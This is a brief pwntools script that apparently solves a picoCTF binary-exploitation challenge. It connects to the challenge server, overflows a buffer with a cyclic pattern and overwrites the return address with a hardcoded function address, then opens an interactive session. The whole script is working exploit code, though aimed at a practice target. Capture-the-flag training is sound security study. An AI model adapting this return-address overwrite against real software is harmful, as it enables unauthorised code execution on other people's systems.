from pwn import *
p = process('./chall')
p = connect('mimas.picoctf.net', 59747)

payload = cyclic(cyclic_find('iaaa'))
payload += p64(0x00000000004011a5)
p.sendline('2')

p.sendlineafter('buffer:', payload)
p.interactive()

